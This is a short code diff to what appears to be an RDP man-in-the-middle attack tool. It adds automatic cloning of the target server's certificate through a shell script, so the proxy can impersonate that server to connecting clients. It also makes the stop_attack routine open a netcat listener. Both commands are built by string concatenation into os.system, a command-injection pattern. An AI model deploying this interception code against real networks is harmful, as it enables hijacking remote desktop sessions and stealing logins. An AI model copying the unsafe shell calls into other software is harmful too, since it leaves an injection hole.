@@ -122,11 +122,21 @@ class RDPProxy(threading.Thread):
         print("Enable SSL")
         try:
             sslversion = get_ssl_version(self.lsock)
+            if args.keyfile and args.certfile:
+                keyfile = args.keyfile
+                certfile = args.certfile
+            else:
+                host = "%s:%s" % (args.target_host, args.target_port)
+                keyfile = "/tmp/certs/%s.key" % host
+                certfile = "/tmp/certs/%s.cert" % host
+                if not os.path.exists(keyfile) or not os.path.exists(certfile):
+                    os.system("./clone-cert.sh " + host)
+                
             self.lsock = ssl.wrap_socket(
                 self.lsock,
                 server_side=True,
-                keyfile=args.keyfile,
-                certfile=args.certfile,
+                keyfile=keyfile,
+                certfile=certfile,
                 ssl_version=sslversion,
             )
             try:
@@ -265,6 +275,8 @@ def get_ssl_version(sock):
 
 
 def stop_attack():
+    if args.check_port:
+        os.system("nc -lp %d &" % args.check_port)
     os._exit(0)
 
 
